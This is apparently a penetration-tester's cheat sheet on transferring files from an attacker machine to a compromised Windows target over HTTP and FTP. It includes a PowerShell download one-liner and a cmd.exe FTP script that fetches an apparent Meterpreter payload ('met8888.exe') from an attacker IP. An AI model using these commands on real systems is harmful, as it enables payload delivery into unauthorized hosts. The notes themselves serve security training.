# File Transfer

File can either be transferred by:
* Push file to target
* Have the target to pull file back

### <span style="color:green">HTTP</span>

**On attacker machine**:

#### <span style="color:green">Apache</span>

copy file to `/var/www/html/`

Start Apache Server

> /etc/init.d/apache2 start


#### <span style="color:green">Python</span>

By running below, current directory will be accessible over HTTP

> python -m SimpleHTTPServer [port no]

**On target machine**:
> http://your_ip_address:your_port_num/filename

If you only have command line access in a Windows machine, use PowerShell's WebClient object:

> powershell -c "<span style="color:blue">(new-object System.Net.WebClient).DownloadFile('http://your_ip_address:your_port_num/filename','C:\Users\dest_path\file_name')</span>"

or use cmd.exe to trigger IE

> cd Program Files\Internet Explorer
> start iexplore.exe [http://ip address/file]

### <span style="color:green">FTP</span>

#### vsftpd/pytftpd

**On attacker machine**:


`vsftpd` or simply the `pytftpd` library

> apt-get install python-pyftpdlib  

> python -m pyftpdlib -p [port_num]

default port is 2121

`-w` can grant the user write access

#### Metasploit

Metasploit has an ftp module `auxiliary/server/ftp`

> use auxiliary/server/ftp

> set FTPROOT /root/shells

> exploit

Can be kill with:
> jobs -k [id]

**On target machine**:

Type it into your cmd.exe

>echo open <span style="color:blue">10.9.122.8</span>\>ftp_commands.txt  
>echo anonymous>>ftp_commands.txt  
>echo whatever>>ftp_commands.txt  
>echo binary>>ftp_commands.txt  
>echo get met8888.exe>>ftp_commands.txt  
>echo bye>>ftp_commands.txt  
><span style="color:blue">ftp -s:ftp_commands.txt</span> 
